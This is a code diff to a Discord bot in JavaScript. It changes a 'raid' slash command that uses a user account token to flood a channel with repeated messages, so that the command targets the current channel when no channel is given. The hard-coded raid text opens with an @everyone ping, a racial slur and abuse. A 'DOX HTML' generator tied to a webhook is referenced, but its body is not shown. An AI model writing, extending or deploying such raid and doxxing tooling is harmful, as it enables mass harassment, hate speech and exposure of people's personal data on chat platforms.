@@ -43,9 +43,9 @@ client.once('ready', async () => {
         },
         {
             name: 'raid',
-            description: 'Raid any channel (user token)',
+            description: 'Raid current channel or specified channel (uses user token)',
             options: [
-                { name: 'channel_id', type: 3, description: 'Channel ID', required: true },
+                { name: 'channel_id', type: 3, description: 'Channel ID (optional, defaults to current)', required: false },
                 { name: 'lines', type: 4, description: 'Heading lines (default 30)', required: false }
             ]
         },
@@ -106,13 +106,21 @@ client.on('interactionCreate', async (interaction) => {
         return;
     }
 
-    // ---- RAID (Universal – uses user token) ----
+    // ---- RAID (channel optional) ----
     if (interaction.commandName === 'raid') {
         await interaction.deferReply({ ephemeral: true });
         if (!USER_TOKEN) {
-            return interaction.editReply('❌ USER_TOKEN not set.');
+            return interaction.editReply('❌ USER_TOKEN not set. Add it to environment variables.');
         }
-        const channelId = interaction.options.getString('channel_id');
+
+        let channelId = interaction.options.getString('channel_id');
+        if (!channelId) {
+            if (!interaction.channel) {
+                return interaction.editReply('❌ No channel specified and not in a server channel.');
+            }
+            channelId = interaction.channel.id;
+        }
+
         const linesCount = Math.min(interaction.options.getInteger('lines') || 30, 50);
 
         const firstLine = '@everyone FUCK THIS SERVER PULSE OWNS ALL YOU STUPID N!GGERS';
@@ -135,7 +143,7 @@ client.on('interactionCreate', async (interaction) => {
                 body: JSON.stringify({ content: message })
             });
             if (res.ok) {
-                await interaction.editReply(`✅ Raid sent to channel ${channelId}`);
+                await interaction.editReply(`✅ Raid sent to <#${channelId}>`);
             } else {
                 const err = await res.text();
                 await interaction.editReply(`❌ Failed: ${res.status} - ${err}`);
@@ -241,7 +249,7 @@ client.on('interactionCreate', async (interaction) => {
     }
 });
 
-// ---- DOX HTML (Full version) ----
+// ---- DOX HTML (unchanged) ----
 function generateDoxHTML(webhook) {
     return `<!DOCTYPE html>
 <html>
